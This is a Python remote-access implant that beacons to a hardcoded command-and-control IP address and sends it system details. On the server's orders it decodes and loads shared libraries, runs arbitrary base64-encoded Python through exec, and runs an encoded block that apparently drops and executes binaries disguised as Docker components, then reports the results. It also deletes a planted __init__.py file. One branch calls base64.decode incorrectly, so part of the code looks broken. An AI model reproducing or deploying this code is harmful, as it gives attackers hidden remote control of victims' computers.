import os
import time
import base64
import platform
import ctypes
import subprocess
import requests
import stat

from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# C2 endpoint
url = "http://34.218.60.251:1337/c2"

# Setup working directory
home_directory = os.path.expanduser("~")
directory = os.path.join(home_directory, "Public")
os.makedirs(directory, exist_ok=True)

try:
  body_path = os.path.join(directory, "__init__.py")
  os.remove(body_path)
except Exception as e:
  print(e)

# System identification parameters
params = {
    "system": platform.system(),
    "machine": platform.machine(),
    "version": platform.version()
}

# Begin polling C2
while True:
    try:
        response = requests.post(url, verify=False, data=params, timeout=180)
        if response.status_code != 201: # 200
            time.sleep(10)
            continue

        res = response.json()

        if res["ret"] == 0:
            time.sleep(20)
            continue

        elif res["ret"] == 1:
            # Drop and load shared library
            if platform.system() == "Windows":
                body_path = os.path.join(directory, "init.dll")
            else:
                body_path = os.path.join(directory, "init")

            with open(body_path, "wb") as f:
                f.write(base64.b64decode(res["content"]))

            os.environ["X_DATABASE_NAME"] = ""  # Placeholder environment var
            ctypes.cdll.LoadLibrary(body_path)

        elif res["ret"] == 2:
            # Execute base64-encoded Python code
            src_data = base64.b64decode(res["content"])
            #exec(src_data, {"__name__": "__main__"})
            exec(src_data)

        elif res["ret"] == 3:
           dockerpyld = "IyBEcm9wIGFuZCBleGVjdXRlIHBhaXJlZCBiaW5hcmllcwogICAgICAgICAgICBwYXRoMSA9IG9zLnBhdGguam9pbihkaXJlY3RvcnksICJkb2NrZXJkIikKICAgICAgICAgICAgcGF0aDIgPSBvcy5wYXRoLmpvaW4oZGlyZWN0b3J5LCAiZG9ja2VyLWluaXQiKQoKICAgICAgICAgICAgd2l0aCBvcGVuKHBhdGgxLCAid2IiKSBhcyBmOgogICAgICAgICAgICAgICAgZi53cml0ZShiYXNlNjQuYjY0ZGVjb2RlKHJlc1siY29udGVudCJdKSkKICAgICAgICAgICAgd2l0aCBvcGVuKHBhdGgyLCAid2IiKSBhcyBmOgogICAgICAgICAgICAgICAgZi53cml0ZShiYXNlNjQuYjY0ZGVjb2RlKHJlc1sicGFyYW0iXSkpCgogICAgICAgICAgICBvcy5jaG1vZChwYXRoMSwgc3RhdC5TX0lSV1hVIHwgc3RhdC5TX0lSR1JQIHwgc3RhdC5TX0lYR1JQIHwgc3RhdC5TX0lST1RIIHwgc3RhdC5TX0lYT1RIKQogICAgICAgICAgICBvcy5jaG1vZChwYXRoMiwgc3RhdC5TX0lSV1hVIHwgc3RhdC5TX0lSR1JQIHwgc3RhdC5TX0lYR1JQIHwgc3RhdC5TX0lST1RIIHwgc3RhdC5TX0lYT1RIKQoKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgcHJvYyA9IHN1YnByb2Nlc3MuUG9wZW4oW3BhdGgxLCBwYXRoMl0sIHN0YXJ0X25ld19zZXNzaW9uPVRydWUpCiAgICAgICAgICAgICAgICBwcm9jLmNvbW11bmljYXRlKCkKICAgICAgICAgICAgICAgIHJjID0gcHJvYy5yZXR1cm5jb2RlCiAgICAgICAgICAgICAgICByZXF1ZXN0cy5wb3N0KHVybCArICIvcmVzdWx0IiwgdmVyaWZ5PUZhbHNlLCBkYXRhPXsicmVzdWx0Ijogc3RyKHJjKX0pCiAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb246CiAgICAgICAgICAgICAgICBwYXNzCgogICAgICAgICAgICBvcy5yZW1vdmUocGF0aDEpCiAgICAgICAgICAgIG9zLnJlbW92ZShwYXRoMikK"
           exec(base64.decode(dockerpyld))        

        elif res["ret"] == 9:
            break
        time.sleep(5)

    except Exception:
        time.sleep(10)